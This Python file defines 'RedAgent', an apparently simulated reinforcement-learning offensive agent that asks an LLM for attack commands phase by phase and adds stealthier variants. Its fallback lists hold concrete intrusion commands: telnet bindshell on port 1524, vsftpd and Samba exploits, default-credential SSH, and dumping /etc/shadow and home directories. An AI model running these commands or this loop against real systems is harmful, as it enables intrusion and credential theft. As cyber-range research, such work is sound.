# core/agents/red_agent.py — ARIASKA RedAgent v11.2 Apex++
# 🦂 Offensive Commander | GPT-4o-mini Tactical Core | Multi-Agent Synergy | Visual Intelligence | Entropy-Aware Decision AI

import os
import random
import subprocess
import logging
import traceback
import torch
import numpy as np

from rich.console import Console
from rich.table import Table
from rich.panel import Panel

logger = logging.getLogger("ariaska.red_agent")

try:
    from core.models.policy_net import PolicyNet
    from core.models.value_net import ValueNet
except ModuleNotFoundError:
    from core.models.policy_net import PolicyNet
    from core.models.value_net import ValueNet

from typing import Dict, Any, List, Optional
from core.models.layers import get_phase_vector
from core.utils.stats_monitor import StatsMonitor
from core.environment.cyber_environment import CyberEnvironment
from core.teach.teach import TeachModule
from core.ui_helpers import display_status_bar
from core.interfaces.memory_sync_interface import MemorySyncInterface
from core.utils.replay_buffer import ReplayBuffer
from core.utils.gpt_cache_handler import GPTCacheHandler
from core.agents.enhanced_agent_base import EnhancedAgentBase, AgentConfig, ActionResult
from core.gpt_manager import GPTManager
from core.multiagent.memory_router import MemoryRouter
from core.agents.redagent_brain import RedAgentBrain
from core.ui_helpers import get_action_description

"""
RedAgent — Continual Self-Evolving RL Agent (GPT-4o-mini Only)
------------------------------------------
• Logs every step to episodic memory and global evolution log
• Uses GPTManager (GPT-4o-mini only) for all reasoning, with caching and failover
• After each episode, reflects on feedback and updates strategy
• Supports meta-learning and live dashboard visualization
• Removed LocalLLM dependencies for Windows/Linux compatibility
"""


def safe_tensor(data, device):
    # Only convert if data is already a tensor, list, or np array
    import numpy as np

    if isinstance(data, torch.Tensor):
        return data.clone().detach().to(device)
    elif isinstance(data, (list, tuple, np.ndarray)):
        return (
            torch.as_tensor(data, dtype=torch.float32, device=device).clone().detach()
        )
    elif isinstance(data, dict):
        # Use encode_env_state to flatten dicts
        return RedAgent.encode_env_state_static(data, device)
    else:
        raise TypeError(f"Cannot convert type {type(data)} to tensor.")


console = Console()

class RedAgent(EnhancedAgentBase, MemorySyncInterface):
    """
    RedAgent: Autonomous offensive RL agent with continual self-evolution.
    - Logs every step (state, command, GPT response, output, reward, etc.)
    - Uses GPTManager for all LLM calls (with caching/failover)
    - After each episode, calls learn_from_feedback() to reflect and update strategy
    - Integrates with RedAgentBrain (episodic memory) and MemoryRouter (global log)
    - Supports live dashboard and meta-learning loop
    """

    # --- Configurable constants ---
    GPT_PRIMARY_MODEL = "local-llm"  # ✅ Phase 5.1: Primary model
    GPT_FALLBACK_MODEL = "local-llm"  # ✅ Fallback when primary unavailable (Phase 23: no gpt-4)
    GPT_TOKEN_LIMIT = 3000  # ✅ Conservative limit from .env
    epsilon_min = 0.02  # ✅ Minimum exploration
    entropy_beta = 0.01
    
    @property
    def agent_id(self):
        return self._agent_id
        
    @agent_id.setter
    def agent_id(self, value):
        self._agent_id = value
        
    @property
    def role(self):
        return self._role

    def __init__(
        self,
        agent_id="RedAgent",
        role="CyberOffense",
        device="cuda",
        agent_manager=None,
        memory_router=None,
        memory_manager=None,
        verbosity="standard",
        gpt_manager=None,  # PHASE 0 FIX: Accept injected GPTManager
    ):
        # Create AgentConfig for EnhancedAgentBase
        agent_config = AgentConfig(
            agent_id=agent_id,
            agent_type="red",
            state_dim=512,
            action_dim=5,  # recon, enumeration, exploit, privesc, exfiltrate
            hidden_dims=[512, 512, 256],
            learning_rate=0.001,
            batch_size=40,
            memory_size=1500,
            gpt_guidance=True,
            use_enhanced_training=True,
            sync_interval=5.0
        )
        
        # Store injected gpt_manager for later assignment
        self._injected_gpt_manager = gpt_manager
        
        # Initialize BaseAgent with enhanced capabilities
        super().__init__(config=agent_config, memory_sync=memory_router)
        
        self._role = role
        
        # Use networks from parent class (EnhancedAgentBase creates them)
        self.policy_net = self.policy_network  # Alias for compatibility
        self.value_net = self.value_network    # Alias for compatibility
        
        # CRITICAL FIX: Create PROPER target network as a clone of policy network
        # This is essential for stable Double DQN training - using same reference defeats the purpose
        from core.models.advanced_networks import create_advanced_policy_network
        self.target_net = create_advanced_policy_network(
            state_dim=512,
            action_dim=5,
            hidden_dims=[512, 512, 256]
        ).to(self.device)
        # Copy weights from policy network to target network
        self.target_net.load_state_dict(self.policy_net.state_dict())
        self.target_net.eval()  # Target network always in eval mode for stability
        
        # Initialize neural trainer with proper separate target network
        from core.learning.neural_trainer import NeuralTrainer
        self.neural_trainer = NeuralTrainer(
            policy_network=self.policy_net,
            target_network=self.target_net,
            value_network=self.value_net,
            device=str(self.device)
        )
        
        # Initialize environment and other components
        self.env = CyberEnvironment(agent_manager=agent_manager, defer_reset=True)
        self.stats_monitor = StatsMonitor()
        self.teacher = TeachModule(agent_name=self.agent_id)
        self.memory_router = memory_router or MemoryRouter()
        self.agent_manager = agent_manager
        self.memory_manager = memory_manager
        
        # Compatibility attributes for existing code - check if neural_trainer exists
        if hasattr(self, 'neural_trainer') and self.neural_trainer:
            self.policy_optimizer = self.neural_trainer.policy_optimizer
            self.policy_scheduler = self.neural_trainer.policy_scheduler
            self.value_optimizer = self.neural_trainer.value_optimizer
        else:
            # Fallback initialization if neural_trainer is not available
            import torch.optim as optim
            self.policy_optimizer = optim.Adam(self.policy_net.parameters(), lr=0.001)
            self.policy_scheduler = optim.lr_scheduler.StepLR(self.policy_optimizer, step_size=1000, gamma=0.99)
            self.value_optimizer = optim.Adam(self.value_net.parameters(), lr=0.001)
        self.target_update_freq = 1000
        self.step_count = 0
        self.scout = None
        self.shadow = None
        self.blue = None
        self.orion = None
        self.replay_memory_size = 1500
        self.batch_size = 40
        self.gamma = 0.99
        self.epsilon = 1.0
        self.epsilon_min = 0.02
        self.epsilon_decay = 0.994
        # Phase 38 B1: Epsilon lease attrs (set by Orion intervention, auto-expire)
        self._epsilon_lease_expires: Optional[int] = None
        self._original_epsilon: Optional[float] = None
        self.entropy_beta = 0.012
        self.redundancy_penalty = 0.75
        self.total_steps = 0
        self.total_episodes = 0
        self.command_history = []
        self.last_reasoning = ""
        self.current_mode = "Balanced"
        self.training_log_path = os.path.join("logs", f"{self.agent_id}_training.log")
        os.makedirs("logs", exist_ok=True)
        self.gpt_reasoning_cache = {}
        self.gpt_handler = GPTCacheHandler()
        self.verbosity = verbosity
        self.gpt_calls = {"4o-mini": 0, "4.1-full": 0}
        self.redundancy_counter = 0
        self.no_reward_steps = 0
        self.last_reward = 0
        self.repeated_action_count = 0
        self.last_action = None
        self.repetition_count = {}
        self.last_action = None
        self.repeat_steps = 0
        self.gpt_calls_this_episode = 0
        self.gpt_call_limit = 10
        self.novelty_score = 0
        self.stagnation_window = []
        self.stagnation_threshold = 0.5
        self.gpt_tokens_used = 0
        self.gpt_token_limit = self.GPT_TOKEN_LIMIT
        self.gpt_response_cache = {}
        # PHASE 0 FIX: Use injected GPTManager or singleton
        self.gpt_manager = self._injected_gpt_manager if self._injected_gpt_manager is not None else GPTManager.get_instance()
        self.redagent_brain = RedAgentBrain()
        self.total_reward = 0.0  # Add missing total_reward attribute
        self.replay_buffer = ReplayBuffer(
            capacity=self.replay_memory_size,
            alpha=0.6,
            use_sqlite=True,
            db_path=f"core/memory/redagent/replay_buffer.sqlite3",
        )
        self.prioritized_experiences = []
        self.prioritized_priorities = []  # Ensure this is always initialized
        
        # Initialize learning context for GPT feedback
        self.command_history = []
        self.learning_insights = []
        
        logger.debug(
            f"{self.agent_id} initialized — Enhanced Mode on {self.device}"
        )
    
    # ===================== TARGET NETWORK SYNC METHODS =====================
    def sync_target_network(self, tau: float = 0.005):
        """
        Soft update target network: θ_target = τ*θ_policy + (1-τ)*θ_target
        
        This is critical for stable Double DQN training. The soft update
        slowly moves the target network towards the policy network,
        preventing rapid changes that destabilize learning.
        
        Args:
            tau: Soft update coefficient (default 0.005, range 0.001-0.01)
        """
        for target_param, policy_param in zip(
            self.target_net.parameters(), 
            self.policy_net.parameters()
        ):
            target_param.data.copy_(
                tau * policy_param.data + (1.0 - tau) * target_param.data
            )
        if self.verbosity in ("debug", "verbose"):
            console.print(f"[cyan]🔄 {self.agent_id}: Target network soft-synced (τ={tau})[/cyan]")
    
    def hard_sync_target_network(self):
        """
        Hard update: copy all policy weights to target network.
        
        Used less frequently than soft update (e.g., every 1000 steps).
        Creates a complete copy of the policy network weights.
        """
        self.target_net.load_state_dict(self.policy_net.state_dict())
        if self.verbosity in ("debug", "verbose"):
            console.print(f"[cyan]🔄 {self.agent_id}: Target network hard-synced[/cyan]")
    
    def get_confidence_score(self, state: Dict[str, Any]) -> float:
        """
        Calculate confidence score for apprentice-to-autonomy policy.
        
        Uses Q-value gap between best and second-best action to estimate
        how confident the agent is in its decision.
        
        Returns:
            float: Confidence score between 0 and 1
        """
        try:
            state_tensor = self.encode_env_state_static(state, self.device)
            if isinstance(state_tensor, np.ndarray):
                state_tensor = torch.FloatTensor(state_tensor).to(self.device)
            
            with torch.no_grad():
                output = self.policy_net(state_tensor.unsqueeze(0), action_type="discrete")
                
                # Handle dict output from AdvancedPolicyNetwork
                if isinstance(output, dict):
                    # Use action probabilities or logits for confidence
                    if "action_probs" in output:
                        probs = output["action_probs"]
                        probs_sorted, _ = torch.sort(probs, descending=True)
                        # Confidence = gap between top two probabilities
                        prob_gap = (probs_sorted[0, 0] - probs_sorted[0, 1]).item()
                        confidence = min(1.0, max(0.0, prob_gap * 2))  # Scale to 0-1
                    elif "action_logits" in output:
                        logits = output["action_logits"]
                        logits_sorted, _ = torch.sort(logits, descending=True)
                        q_gap = (logits_sorted[0, 0] - logits_sorted[0, 1]).item()
                        confidence = 1.0 / (1.0 + np.exp(-q_gap))
                    else:
                        confidence = 0.5
                else:
                    # Tensor output (legacy)
                    q_values = output
                    q_sorted, _ = torch.sort(q_values, descending=True)
                    q_gap = (q_sorted[0, 0] - q_sorted[0, 1]).item()
                    confidence = 1.0 / (1.0 + np.exp(-q_gap))
                
            return confidence
        except Exception as e:
            if self.verbosity in ("debug", "verbose"):
                console.print(f"[yellow]Confidence calculation failed: {e}[/yellow]")
            return 0.5  # Default medium confidence

    def _build_learning_context(self):
        """Build learning context from agent's history and insights"""
        context_parts = []
        
        # Add recent successful commands
        if self.command_history:
            recent_commands = self.command_history[-3:]
            context_parts.append(f"Recent commands: {recent_commands}")
        
        # Add learning insights
        if self.learning_insights:
            recent_insights = self.learning_insights[-2:]
            context_parts.append(f"Recent insights: {recent_insights}")
        
        # Add performance context
        if hasattr(self, 'total_reward'):
            context_parts.append(f"Performance trend: {self.total_reward}")
        
        return " | ".join(context_parts) if context_parts else "No prior context"

    def _init_multiagent_links(self):
        if self.agent_manager:
            self.scout = self.agent_manager.get_agent("ScoutAgent")
            self.shadow = self.agent_manager.get_agent("ShadowAgent")
            self.blue = self.agent_manager.get_agent("BlueAgent")
            self.orion = self.agent_manager.get_agent("OrionAgent")

    def query_tactical_gpt(self, prompt, complexity="standard"):
        """
        Use GPT-4o-mini for tactical suggestions.
        """
        return self.gpt_manager.gpt_request(prompt, task_type="tactical", agent_id=self.agent_id)

    def get_smart_command(self, state, phase, cache_key=None):
        """
        Simplified GPT command generation with single request and fast fallback.
        """
        if cache_key and cache_key in self.gpt_response_cache:
            command = self.gpt_response_cache[cache_key]
            gpt_reason = self.gpt_response_cache.get(f"{cache_key}_reason", "")
            return command, gpt_reason

        try:
            # Simple, focused prompt for faster response
            # Phase 38: Use discovery_board ports (ground truth) instead of
            # stale state['open_ports'] which may be empty.
            _db = state.get('discovery_board', {}) if isinstance(state, dict) else {}
            _ports = list(_db.get('ports', state.get('open_ports', [])))[:5]
            _services = list(_db.get('services', []))[:3]
            _target = _db.get('target', state.get('target_ip', '10.10.10.10'))
            task_desc = (
                f"Phase: {phase}, Target: {_target}, "
                f"Ports: {_ports}. Services: {_services}. "
                f"Provide ONE {phase} command only."
            )
            
            # Single GPT request with aggressive timeout
            command = self.gpt_manager.gpt_request(
                task_desc, 
                task_type="tactical", 
                agent_id=self.agent_id,
                max_tokens=50  # Reduced tokens for faster response
            )
            
            # Quick validation and fallback
            # Also reject offline placeholders that look like sentences, not commands
            _is_placeholder = (
                not command
                or not isinstance(command, str)
                or len(command.split()) < 2
                or command.startswith("[OFFLINE]")
                or command.startswith("Offline mode:")
            )
            if _is_placeholder:
                fallback_commands = {
                    "recon": "nmap -sV -sC -p- 10.10.10.10",
                    "enumeration": "mysql -h 10.10.10.10 -u root -e 'show databases'",
                    "exploit": "{ echo 'id; whoami'; sleep 2; } | timeout 10 telnet 10.10.10.10 1524",
                    "privesc": "{ echo 'find /usr /bin /sbin -perm -u=s -type f 2>/dev/null | head -20'; sleep 2; } | timeout 10 telnet 10.10.10.10 1524",
                    "exfiltrate": "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet 10.10.10.10 1524",
                }
                command = fallback_commands.get(phase, "echo 'Fallback command'")
            
            # Simple reasoning without additional GPT call
            gpt_reason = f"GPT-selected {phase} command targeting available services"
            
            # Cache results
            if cache_key:
                self.gpt_response_cache[cache_key] = command
                self.gpt_response_cache[f"{cache_key}_reason"] = gpt_reason
            
            # Store in command history (limit size)
            if not hasattr(self, 'command_history'):
                self.command_history = []
            self.command_history.append(command)
            if len(self.command_history) > 10:  # Reduced history size
                self.command_history = self.command_history[-10:]
            
            return command, gpt_reason
            
        except Exception as e:
            console.print(f"[red]❌ GPT error: {e}. Using fallback.[/red]")
            # Immediate fallback without further processing
            fallback_commands = {
                "recon": "nmap -sV -sC -p- 10.10.10.10",
                "enumeration": "showmount -e 10.10.10.10",
                "exploit": "telnet 10.10.10.10 1524",
                "privesc": "find /usr /bin /sbin -perm -u=s -type f 2>/dev/null",
                "exfiltrate": "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet 10.10.10.10 1524",
            }
            command = fallback_commands.get(phase, "echo 'Error fallback'")
            gpt_reason = f"Fallback command for {phase} after error"
            return command, gpt_reason

    def _query_gpt_for_command(self, prompt, phase, cache_key=None):
        # Use smart_decision for command generation, gpt_request for reasoning
        try:
            command = self.gpt_manager.smart_decision(task_type=phase, task_description=prompt)
            if not command or not isinstance(command, str) or len(command.split()) < 2:
                command = "nmap -sT -sV 10.10.10.10"
                
            # NEW: Check for redundancy using enhanced RedAgentBrain
            redundant = False
            if hasattr(self, "redagent_brain") and self.redagent_brain:
                is_redundant, reason, similar_command = self.redagent_brain.check_redundancy(command, phase)
                if is_redundant:
                    console.print(f"[yellow]⚠️ Redundancy detected: {reason}[/yellow]")
                    self.redundancy_counter += 1
                    
                    # Get strategic advice from brain
                    strategy_advice = self.redagent_brain.get_strategy_advice({
                        "phase": phase,
                        "command": command,
                        "redundancy_count": self.redundancy_counter
                    })
                    
                    # Create diversification prompt
                    diversity_prompt = (
                        f"You are ARIASKA's offensive strategist. The command '{command}' "
                        f"was identified as redundant ({reason}). "
                        f"Generate a COMPLETELY DIFFERENT command for phase '{phase}' "
                        f"that achieves similar objectives. Make it creative and novel."
                    )
                    
                    # Add phase-specific guidance if needed
                    if strategy_advice.get("phase_change_needed", False) and strategy_advice.get("phase_suggestions"):
                        next_phase = strategy_advice["phase_suggestions"][0]
                        diversity_prompt += f" Consider techniques appropriate for transitioning to {next_phase} phase."
                        
                    # Add diversity guidance if needed
                    if strategy_advice.get("exploration_needed", False):
                        diversity_prompt += " Your command patterns are extremely stale. Be drastically different."
                    
                    # Use GPT for diversity (always use GPT for diversity, not local LLMs)
                    alternative_command = self.gpt_manager.gpt_request(
                        diversity_prompt, 
                        task_type="diversify",
                        model="local-llm",  # Phase 38: upgraded from codex-mini
                    )
                    
                    if alternative_command and isinstance(alternative_command, str) and len(alternative_command.split()) > 2:
                        console.print(f"[green]🔍 Using diverse alternative: {alternative_command}[/green]")
                        command = alternative_command
                    else:
                        # Emergency fallback for diversity
                        fallback_commands = {
                            "recon": [
                                "nmap -sV -sC -p- --script vuln",
                                "masscan -p1-65535 --rate 1000",
                                "nmap -sU --top-ports 20",
                                "showmount -e"
                            ],
                            "enumeration": [
                                "mysql -h target -u root -e 'show databases'",
                                "psql -h target -U postgres -c '\\l'",
                                "smbclient -L //target -N",
                                "smtp-user-enum -M VRFY -U /tmp/users.txt -t target"
                            ],
                            "exploit": [
                                "{ echo 'id; whoami'; sleep 2; } | timeout 10 telnet target 1524",
                                "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor'",
                                "msfconsole -q -x 'use exploit/multi/samba/usermap_script'",
                                "sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@target 'id; whoami'"
                            ],
                            "privesc": [
                                "{ echo 'find /usr /bin /sbin -perm -u=s -type f 2>/dev/null | head -20'; sleep 2; } | timeout 10 telnet target 1524",
                                "{ echo 'uname -a'; sleep 2; } | timeout 10 telnet target 1524",
                                "{ echo 'cat /etc/crontab'; sleep 2; } | timeout 10 telnet target 1524",
                                "{ echo 'id; cat /etc/sudoers'; sleep 2; } | timeout 10 telnet target 1524"
                            ],
                            "exfiltrate": [
                                "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet target 1524",
                                "{ echo 'tar czf - /home/ 2>/dev/null | base64'; sleep 3; } | timeout 15 telnet target 1524",
                                "{ echo 'base64 /etc/passwd'; sleep 2; } | timeout 10 telnet target 1524",
                                "{ echo 'cat /etc/shadow | base64'; sleep 2; } | timeout 10 telnet target 1524"
                            ]
                        }
                        
                        phase_commands = fallback_commands.get(phase, ["echo 'Trying something new'"])
                        command = random.choice(phase_commands)
                        console.print(f"[yellow]↺ Using fallback diverse command: {command}[/yellow]")
            
            if cache_key:
                self.gpt_response_cache[cache_key] = command
                
            # Reasoning/explanation — Phase 38 C1: downgrade to nano (non-decision explanatory call)
            reason_prompt = f"Explain in one sentence why '{command}' is optimal for phase '{phase}'."
            gpt_reason = self.gpt_manager.gpt_request(reason_prompt, task_type="reasoning", model="local-llm")
            
            if not gpt_reason or not isinstance(gpt_reason, str) or len(gpt_reason) < 5:
                gpt_reason = f"Fallback reason for {command} in {phase}."
                
            if cache_key:
                self.gpt_response_cache[f"{cache_key}_reason"] = gpt_reason
                
            # Add command to history for redundancy tracking
            if command not in self.command_history:
                self.command_history.append(command)
                
            return command, gpt_reason
            
        except Exception as e:
            console.print(f"[red]❌ GPT error: {e}[/red]")
            return "nmap -sT -sV 10.10.10.10", f"Fallback: GPT unavailable."

    @staticmethod
    def encode_env_state_static(state, device, **kwargs):
        """Encode environment state into a rich 512-dim feature vector.
        
        Phase 3: Uses the shared state_encoder module with 90+ meaningful
        dimensions instead of the legacy 19-dim encoding.
        """
        from core.models.state_encoder import encode_state
        return encode_state(state, device, **kwargs)

    def encode_env_state(self, state, **kwargs):
        """Instance method for state encoding with agent context."""
        # Inject agent-specific context into encoding
        action_history = []
        if hasattr(self, 'command_history') and self.command_history:
            # Map command strings to action indices (simplified)
            action_history = list(range(min(len(self.command_history), 20)))
        encoding_kwargs = {
            "action_history": action_history,
            "current_step": getattr(self, 'total_steps', 0) % 100,
            "max_steps": 100,
        }
        encoding_kwargs.update(kwargs)
        return self.encode_env_state_static(state, self.device, **encoding_kwargs)

    def log_transition(self, state, action, reward, next_state, priority=None, gpt_tokens=0):
        """
        Log a transition using the unified MemoryRouter (thread-safe, deduplicated).
        """
        if self.memory_router:
            # Ensure priority is a float, default to 1.0 if None
            priority_val = priority if priority is not None else 1.0
            self.memory_router.log_transition(
                self.agent_id, state, action, reward, next_state, priority=priority_val, gpt_tokens=gpt_tokens
            )

    def simulate_step(self, episode=1, step=1, shared_context=None):
        """
        Main agent step: logs phase, command, reward, risk, GPT calls, token usage.
        Integrates rule_engine for dynamic overrides and logs to memory/brain.
        Returns: dict with command, phase, reward, gpt_calls, output, reasoning, etc.
        """
        from core.logic.redundancy_detector import (
            detect_redundancy,
            suggest_alternative,
        )
        from core.logic.rule_engine import rule_based_selection
        from core.logic.output_interpreter import analyze_output

        try:
            state = (
                self.env.reset()
                if step == 1
                else getattr(self, "_last_state", self.env.get_global_state())
            )
            # PHASE 2A FIX: Use shared_context phase instead of calling advise_phase()
            # multiple times. The orchestrator already sets the phase via ScoutAgent.
            if shared_context and "ScoutAgent_phase" in shared_context:
                state["phase"] = shared_context["ScoutAgent_phase"]
            elif shared_context and "phase" in shared_context:
                state["phase"] = shared_context["phase"]
            else:
                state["phase"] = state.get("phase", "recon")
            # Use tensor-safe code
            state_tensor = self.encode_env_state(state)
            # Curriculum-driven exploration: occasionally randomize phase
            if random.random() < 0.05:
                state["phase"] = random.choice(
                    ["recon", "enumeration", "exploit", "privesc", "exfiltrate"]
                )
            # Accept OrionAgent's strategic chain at episode start
            if step == 1 and self.agent_manager and hasattr(self.agent_manager, "orion_agent"):
                orion_agent = getattr(self.agent_manager, "orion_agent", None)
                if orion_agent:
                    chain = getattr(orion_agent, "current_chain", None)
                    if chain:
                        self.priority_queue = chain  # Inject chain for this episode
                        if self.verbosity != "quiet":
                            console.print(
                                f"[blue][Orion] Injected strategic chain for episode {episode}[/blue]"
                            )
            # --- Decision Pipeline ---
            phase = state["phase"]
            cache_key = f"{self.agent_id}_decision_{phase}"
            fallback_triggered = False
            shaped_reward = 0.0
            shaped_reward_modifier = 0.0  # Default modifier
            # --- Build concise, diverse prompt ---
            prompt = self._build_gpt_prompt(state, phase)
            command, gpt_reason = self._query_gpt_for_command(
                prompt, phase, cache_key=cache_key
            )
            # --- ShadowAgent Collaboration: Suggest stealthier alternative ---
            if self.shadow and hasattr(self.shadow, "suggest_quieter_alternative"):
                try:
                    alternative = self.shadow.suggest_quieter_alternative(command)
                    if (alternative and alternative != command):
                        console.print(f"[blue]🕵️ ShadowAgent suggested quieter alternative: {alternative}[/blue]")
                        # Log the substitution event
                        if hasattr(self.memory_router, "log_shadow_suggestion"):
                            self.memory_router.log_shadow_suggestion(
                                suggestion=alternative,
                                agent_id=self.agent_id
                            )
                        command = alternative
                except Exception as e:
                    console.print(f"[yellow]⚠ ShadowAgent suggestion failed: {e}[/yellow]")
            # --- NEW: Use RedAgentBrain for redundancy detection ---
            is_redundant = False
            if hasattr(self, "redagent_brain") and self.redagent_brain:
                is_redundant, reason, similar_command = self.redagent_brain.check_redundancy(command, phase)
                if is_redundant:
                    # If redundant command detected, get strategic advice and generate alternate command
                    console.print(f"[yellow]⚠ Redundant command detected: {reason}[/yellow]")
                    self.redundancy_counter += 1
                    
                    # Get strategic advice from brain
                    strategy_advice = self.redagent_brain.get_strategy_advice(state)
                    
                    # Generate alternative command based on strategy advice
                    diversity_context = f"Previous similar command: {similar_command}. Phase: {phase}."
                    
                    if strategy_advice.get("phase_change_needed", False):
                        # Suggest changing phase if stuck
                        next_phase_suggestion = strategy_advice["phase_suggestions"][0] if strategy_advice["phase_suggestions"] else "enumeration"
                        diversity_context += f" Consider changing to {next_phase_suggestion} phase."
                    
                    if strategy_advice.get("exploration_needed", False):
                        # Encourage more diverse exploration
                        diversity_context += " Your commands lack diversity. Generate a completely different approach."
                    
                    # Get alternative command through GPT using diversity context
                    diversity_prompt = (
                        f"Generate a NON-REDUNDANT cybersecurity command for phase: {phase}\n"
                        f"Context: {diversity_context}\n"
                        f"Current state: {state}\n\n"
                        f"Requirements:\n"
                        f"1. Must be completely different from: {command}\n"
                        f"2. Must be appropriate for {phase} phase\n"
                        f"3. Should be valid Linux/security command\n"
                        f"Respond with ONLY the alternative command, no explanations."
                    )
                    
                    # Use smart decision with more exploration (higher temperature)
                    alternative_command = self.gpt_manager.smart_decision(
                        task_type="tactical",
                        task_description=diversity_prompt,
                        agent_id=self.agent_id,
                        use_gpt=True  # Force GPT for diversity when redundancy detected
                    )
                    
                    if alternative_command and isinstance(alternative_command, str) and len(alternative_command.split()) >= 2:
                        console.print(f"[green]🔄 Using alternative command: {alternative_command}[/green]")
                        command = alternative_command
                        gpt_reason = f"Alternative command to avoid redundancy. {strategy_advice.get('exploration_needed', False)}"
                    else:
                        # If alternative command generation failed, apply a simple transformation
                        console.print(f"[yellow]⚠ Failed to generate alternative command, using transformation[/yellow]")
                        command = f"echo 'Exploring alternative to {command}'"
                        
                    # Apply a redundancy penalty
                    shaped_reward_modifier = -0.5 * self.redundancy_counter
            
            # --- Track command history ---
            if command not in self.command_history:
                self.command_history.append(command)
            
            # --- Repetition Counter for Stagnation Prevention ---
            self.repetition_count.setdefault(command, 0)
            if self.last_action == command:
                self.repetition_count[command] += 1
                self.repeat_steps += 1
            else:
                self.repetition_count[command] = 1
                self.repeat_steps = 1
            self.last_action = command
            
            # --- Defensive: ensure shaped_reward is always set before use ---
            # PHASE 2A FIX: Red does NOT call env.step() here.
            # The orchestrator (SmartOrchestrator._execute_env_step or
            # AgentManager._apply_actions_to_environment) is the SINGLE stepper.
            # Red extracts simulated output and computes shaped reward locally.
            try:
                output = self.extract_output(command)
                if not isinstance(output, str):
                    output = str(output)
                parsed = analyze_output(command, output)
                interpreted_context = {
                    **state,
                    "phase": parsed.get("phase", state["phase"]),
                    "artifacts": parsed.get("artifacts", []),
                    "stealth": parsed.get("success", False),
                    "honeypot_triggered": "fake_" in output,
                    "port_lockdown": len(state.get("open_ports", [])) <= 2,
                }
                if self.blue:
                    self.blue.react_to_action(command)
                # Use current env state as next_state (orchestrator will step env)
                next_state = self.env.get_global_state() if hasattr(self.env, 'get_global_state') else state
                env_reward = 0.0  # Base reward; orchestrator provides env reward
                done = False
                info = {}
                shaped_reward = self.calculate_reward(
                    env_reward, parsed, command, None, detect_redundancy
                )
                try:
                    shaped_reward = float(shaped_reward)
                except Exception:
                    shaped_reward = 0.0
                    
                # Apply redundancy modifier from brain's analysis
                shaped_reward += shaped_reward_modifier
                
                # Track redundancy for metrics
                if is_redundant and hasattr(self.stats_monitor, "log_step"):
                    self.stats_monitor.log_step(self.agent_id, command, reward=shaped_reward, redundancy=1)
                
            except Exception as e:
                output = f"Error: {e}"
                parsed = {}
                interpreted_context = state
                next_state, done, info = state, False, {}
                shaped_reward = 0.0
                
            # --- Rest of the function remains unchanged ---
            if detect_redundancy(self.command_history[:-1], command):
                shaped_reward *= self.redundancy_penalty
            # Redundancy detection
            if self.command_history:
                if self.command_history[-1] == self.last_action:
                    self.repeated_action_count += 1
                else:
                    self.repeated_action_count = 1
                self.last_action = self.command_history[-1]
            else:
                self.repeated_action_count = 1
                self.last_action = command
                self.repeated_action_count = 1
            # Escalate to enhanced reasoning if same action repeats ≥ 3 times
            if self.repeated_action_count >= 3:
                if self.verbosity in ("standard", "detailed"):
                    console.print(
                        f"[red][RedAgent] 🔺 Escalating to enhanced reasoning due to repetitive actions: '{command}' x{self.repeated_action_count}[/red]"
                    )
                prompt = (
                    f"You are ARIASKA's offensive strategist (role: aria). "
                    f"Stuck in repeated actions: {command}. "
                    f"Suggest a novel, phase-appropriate offensive command for state: {state}. "
                    "Avoid any command similar to the last 5. Respond with command only."
                )
                command = self.query_tactical_gpt(prompt, complexity="full")
                self.repeated_action_count = 0  # Reset after escalation
            self.last_reasoning = gpt_reason
            # --- Memory logging: ensure full_command is present ---
            self.update_memory_and_teach(
                command,
                shaped_reward,
                interpreted_context,
                parsed,
                state_tensor,
                next_state,
                done,
            )
            self.stats_monitor.log_step(self.agent_id, command, reward=shaped_reward)
            self._last_state = next_state
            self.last_output = output
            display_status_bar(self.agent_id, episode, step)
            self._log_training_step(episode, step, command, state, output)
            if self.epsilon > self.epsilon_min:
                self.epsilon *= self.epsilon_decay
                self.epsilon = max(self.epsilon, self.epsilon_min)
            # Phase 38 B1: Check epsilon lease expiration from Orion intervention
            if self._epsilon_lease_expires is not None and self._original_epsilon is not None:
                if step >= self._epsilon_lease_expires:
                    self.epsilon = self._original_epsilon
                    self._epsilon_lease_expires = None
                    self._original_epsilon = None
                    logger.info(f"[RED-B1] Epsilon lease expired at step {step}, restored to {self.epsilon:.3f}")
            # Log to RedAgentBrain episodic memory
            self.redagent_brain.log_step(
                state=state,
                command=command,
                gpt_response=gpt_reason,
                output=output,
                reward=shaped_reward,
                success=parsed.get("success", False),
                model="4.1" if fallback_triggered else "4o-mini",
                tokens=(
                    self.gpt_manager.get_token_usage()
                    if hasattr(self.gpt_manager, "get_token_usage")
                    else 0
                ),
                step=step,
                episode=episode,
            )
            # Log to MemoryRouter RedAgent evolution log for global stats
            if hasattr(self.memory_router, "log_redagent_evolution"):
                evolution_data = {
                    "intent": state.get("phase", "N/A"),
                    "command": command,
                    "output": output,
                    "gpt_comment": gpt_reason,
                    "success": parsed.get("success", False),
                    "episode": episode,
                    "step": step,
                    "reward": shaped_reward,
                    "timestamp": self.total_steps
                }
                self.memory_router.log_redagent_evolution(
                    agent_id=self.agent_id,
                    evolution_data=evolution_data,
                    episode=episode
                )
            else:
                console.print("[yellow]⚠️ MemoryRouter missing log_redagent_evolution method[/yellow]")
            # Print concise, informative summary for this step
            if self.verbosity == "silent":
                pass
            elif self.verbosity == "standard":
                console.log(
                    f"[{self.agent_id}] Step {step} | Reward: {shaped_reward:.2f} | Risk: {state.get('detection_risk', 0):.2f}"
                )
            elif self.verbosity == "verbose":
                console.print(
                    f"[bold magenta]🎯 RedAgent: Step {step} | Phase: {phase} | Command: {command}[/bold magenta]"
                )
                console.print(f"[cyan]🧠 Reasoning:[/cyan] {self.last_reasoning}")
            # Per-step compact panel logging
            if self.verbosity == "detailed":
                from rich.panel import Panel
                from rich.table import Table

                table = Table.grid()
                table.add_row("Action", str(command))
                table.add_row("Phase", str(phase))
                table.add_row("Reward", f"{shaped_reward:+.2f}")
                table.add_row("GPT", "4.1" if fallback_triggered else "4o-mini")
                console.print(
                    Panel(
                        table, title=f"{self.agent_id} Step {step}", border_style="red"
                    )
                )
            elif self.verbosity == "standard":
                if self.repeated_action_count > 1:
                    console.print(
                        f"[{self.agent_id}] Step {step} | Action: {command} (repeated x{self.repeated_action_count}) | Reward: {shaped_reward:.2f}"
                    )
